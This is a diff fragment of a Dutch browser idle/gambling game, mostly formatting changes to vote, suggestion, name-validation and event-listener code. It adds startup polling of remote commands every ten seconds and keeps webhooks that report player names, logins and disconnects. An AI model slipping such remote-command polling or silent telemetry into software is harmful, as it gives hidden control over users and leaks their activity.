     if (VALID_CODES[code]) {
       usedCodes.add(code);
       const result = VALID_CODES[code]();
@@ -1942,12 +1911,12 @@ setInterval(pollRemoteCommands, 10000);
     }
   }
 
-  // ── VOTE ──────────────────────────────────────────────────────────────────
+  // ── VOTE ───────────────────────────────────────────────────────────────────
   function openVotePanel() {
-    const oldVote    = localStorage.getItem(VOTE_KEY);
-    const voteInfo   = $("voteInfo");
-    voteInfo.style.color = "var(--muted)";
-    voteInfo.innerText   = oldVote ? "Jouw stem: " + oldVote : "Je hebt nog niet gestemd.";
+    const oldVote = localStorage.getItem(VOTE_KEY);
+    const info    = $("voteInfo");
+    info.style.color = "var(--muted)";
+    info.innerText   = oldVote ? "Jouw stem: " + oldVote : "Je hebt nog niet gestemd.";
     if (oldVote) {
       const sel = document.querySelector(`input[name="voteOption"][value="${oldVote}"]`);
       if (sel) sel.checked = true;
@@ -1958,9 +1927,9 @@ setInterval(pollRemoteCommands, 10000);
   function submitVote() {
     const sel = document.querySelector("input[name='voteOption']:checked");
     if (!sel) { showNotice("Kies eerst een optie", "var(--danger)"); return; }
-    const choice   = sel.value;
-    const name     = localStorage.getItem(NAME_KEY) || "Onbekend";
-    const oldVote  = localStorage.getItem(VOTE_KEY);
+    const choice  = sel.value;
+    const name    = localStorage.getItem(NAME_KEY) || "Onbekend";
+    const oldVote = localStorage.getItem(VOTE_KEY);
     if (oldVote && oldVote !== choice) { showNotice("Je kan maar 1 keer stemmen", "var(--danger)"); return; }
     if (!oldVote) {
       localStorage.setItem(VOTE_KEY, choice);
@@ -1972,22 +1941,21 @@ setInterval(pollRemoteCommands, 10000);
     closeOverlay("votePanel");
   }
 
-  // ── SUGGESTION ────────────────────────────────────────────────────────────
+  // ── SUGGESTION ─────────────────────────────────────────────────────────────
   function sendSuggestion() {
     const input = $("suggestionInput");
     const msg   = input.value.trim();
     if (!msg) return;
     if (Date.now() - lastSuggTime < 180000) { showNotice("Wacht 3 minuten tussen suggestions", "var(--danger)"); return; }
     sendWebhook(WEBHOOKS.sugg, `${localStorage.getItem(NAME_KEY) || "Onbekend"}: ${msg}`);
-    input.value = "";
+    input.value  = "";
     closeOverlay("suggestionPanel");
     lastSuggTime = Date.now();
     showNotice("Suggestion verzonden", "var(--accent2)");
   }
 
-  // ── NAME VALIDATION ───────────────────────────────────────────────────────
+  // ── NAME VALIDATION ────────────────────────────────────────────────────────
   function isBanned(name) { return BANNED_WORDS.some(w => name.toLowerCase().includes(w)); }
-  function isTaken(name)  { return isTakenByLB(name); }
 
   function getOfflineBonus() {
     const last = parseInt(localStorage.getItem(LAST_ONLINE_KEY)) || Date.now();
@@ -2000,7 +1968,7 @@ setInterval(pollRemoteCommands, 10000);
     const errEl = $("nameError");
     if (!raw || raw.length < 2)  { errEl.innerText = raw ? "Naam moet minimaal 2 tekens zijn." : "Voer een naam in."; return; }
     if (isBanned(raw))           { errEl.innerText = "Die naam is niet toegestaan."; return; }
-    if (isTaken(raw))            { errEl.innerText = "Die naam is al in gebruik."; return; }
+    if (isTakenByLB(raw))        { errEl.innerText = "Die naam is al in gebruik."; return; }
     errEl.innerText = "";
     localStorage.setItem(NAME_KEY, raw);
     sendWebhook(WEBHOOKS.login, `player logged in: ${raw}`);
@@ -2011,20 +1979,14 @@ setInterval(pollRemoteCommands, 10000);
     $("offlineTime").innerText  = od.minutes > 0 ? `Je bent ${od.minutes} minuten offline geweest` : "";
   }
 
-  // ── START SCREEN INIT ─────────────────────────────────────────────────────
+  // ── START SCREEN INIT ──────────────────────────────────────────────────────
   const storedName      = localStorage.getItem(NAME_KEY);
   const hasPlayedBefore = localStorage.getItem(LAST_ONLINE_KEY) !== null;
-  const isNatteHark     = storedName && storedName.toLowerCase() === "natte hark";
-
-  if (isNatteHark && !localStorage.getItem(NATTE_HARK_MESSAGE_KEY)) {
-    score = earned = lost = highest = 0;
-    localStorage.setItem(NATTE_HARK_MESSAGE_KEY, "true");
-  }
 
   if (!localStorage.getItem(VERSION_NOTICE_KEY)) {
     const vn = $("versionNotice");
     vn.style.display = "block";
-    vn.innerHTML = "Nieuwe versie: 2.2<br>Bekijk de changelogs in settings<br>Leaderboard van versie 2.1 staat nu vast";
+    vn.innerHTML = "Nieuwe versie: 2.3 — Leaderboard gereset!<br>Bekijk de changelogs in settings";
     localStorage.setItem(VERSION_NOTICE_KEY, "1");
   }
 
@@ -2033,10 +1995,7 @@ setInterval(pollRemoteCommands, 10000);
     $("nameSection").style.display = "flex";
   } else {
     const od = getOfflineBonus();
-    if (isNatteHark && localStorage.getItem(NATTE_HARK_MESSAGE_KEY)) {
-      $("offlineBonus").innerText = "je geld is gereset report bug in suggestions";
-      $("offlineTime").innerText  = "";
-    } else if (od.minutes > 0) {
+    if (od.minutes > 0) {
       $("offlineBonus").innerText = `+ ${fmtMain(od.bonus)} Lantings (offline bonus)`;
       $("offlineTime").innerText  = `Je bent ${od.minutes} minuten offline geweest`;
     }
@@ -2048,7 +2007,7 @@ setInterval(pollRemoteCommands, 10000);
     $("main").style.display        = "flex";
   }
 
-  // ── EVENT LISTENERS ───────────────────────────────────────────────────────
+  // ── EVENT LISTENERS ────────────────────────────────────────────────────────
   $("confirmNameBtn").addEventListener("click", confirmName);
   $("nameInput").addEventListener("keydown", e => { if (e.key === "Enter") confirmName(); });
 
@@ -2068,7 +2027,7 @@ setInterval(pollRemoteCommands, 10000);
 
   keybindBtn.innerText = keybindDisplay;
   keybindBtn.addEventListener("click", () => {
-    waitingForKey    = !waitingForKey;
+    waitingForKey = !waitingForKey;
     keybindBtn.innerText = waitingForKey ? "..." : keybindDisplay;
   });
 
@@ -2114,14 +2073,14 @@ setInterval(pollRemoteCommands, 10000);
   $("rollsExitBtn").addEventListener("click", () => closeOverlay("rollsScreen"));
   $("rollPlayBtn").addEventListener("click", () => playRolls());
   $("rollMinBtn").addEventListener("click", () => setInputToMinBet("rollBet"));
-  $("rollAllBtn").addEventListener("click", () => playRolls({ allIn:true, bet:score }));
+  $("rollAllBtn").addEventListener("click", () => playRolls({ allIn: true, bet: score }));
   $("rollCount").addEventListener("input", e => { $("rollCountVal").innerText = e.target.value; });
 
   $("openMinesBtn").addEventListener("click", () => { if (!unlockedMines) return; closeOverlay("gambleScreen"); openOverlay("minesScreen"); });
   $("minesExitBtn").addEventListener("click", () => closeOverlay("minesScreen"));
   $("minesStartBtn").addEventListener("click", () => startMinesGame());
   $("minesMinBtn").addEventListener("click", () => setInputToMinBet("minesBet"));
-  $("minesAllInBtn").addEventListener("click", () => startMinesGame({ allIn:true, bet:score }));
+  $("minesAllInBtn").addEventListener("click", () => startMinesGame({ allIn: true, bet: score }));
   $("minesCashoutBtn").addEventListener("click", cashoutMines);
 
   $("skinBtn").addEventListener("click", () => { openOverlay("skinScreen"); renderSkins(); });
@@ -2144,10 +2103,10 @@ setInterval(pollRemoteCommands, 10000);
   $("suggestionInput").addEventListener("keydown", e => { if (e.key === "Enter") sendSuggestion(); });
 
   window.addEventListener("beforeunload", () => {
-    navigator.sendBeacon(WEBHOOKS.main, new Blob([JSON.stringify({content:"client disconnected"})], {type:"application/json"}));
+    navigator.sendBeacon(WEBHOOKS.main, new Blob([JSON.stringify({ content: "client disconnected" })], { type: "application/json" }));
   });
 
-  // ── INTERVALS ─────────────────────────────────────────────────────────────
+  // ── INTERVALS ──────────────────────────────────────────────────────────────
   setInterval(() => {
     playTime++;
     const ps = Date.now() < boosts.ps ? cl(perSecond * 2.5) : perSecond;
@@ -2176,7 +2135,11 @@ setInterval(pollRemoteCommands, 10000);
     renderBoosts();
   }, 1000);
 
-  // ── INITIAL RENDER ────────────────────────────────────────────────────────
+  // ── REMOTE COMMANDS (start after init) ────────────────────────────────────
+  pollRemoteCommands();
+  setInterval(pollRemoteCommands, 10000);
+
+  // ── INITIAL RENDER ─────────────────────────────────────────────────────────
   $("rollCountVal").innerText = $("rollCount").value;
   applyEquippedSkin();
   renderUnlockTiles();
